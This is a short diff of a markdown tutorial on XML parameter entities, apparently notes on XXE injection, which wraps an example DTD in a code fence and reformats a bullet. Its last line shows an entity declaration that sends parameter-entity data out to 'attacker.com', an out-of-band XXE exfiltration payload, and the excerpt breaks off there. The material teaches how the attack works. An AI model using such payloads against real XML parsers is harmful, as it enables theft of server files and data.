@@ -182,16 +182,18 @@ To use the parameter entity, you need to declare an additional general entity:
 
 * Here, `myGreeting` is a general entity that uses the value of the parameter entity `%greeting`.
 
+
+```
 <!DOCTYPE test [
 <!ENTITY % parameter_entity "<!ENTITY general_entity 'pwnfunction'>">
 %parameter_entity;
 ]>
 
 <pwn>&general_entity;</pwn>
+```
 
 
-
-Parameter entity reference must not occur with in markup declarations, this doesn't apply to external parameter entity or dtd  
+* Parameter entity reference must not occur with in markup declarations, this doesn't apply to external parameter entity or dtd  
 
 ```
  <!ENTITY % ent "<!ENTITY send SYSTEM 'http://attacker.com/?%test;'>">
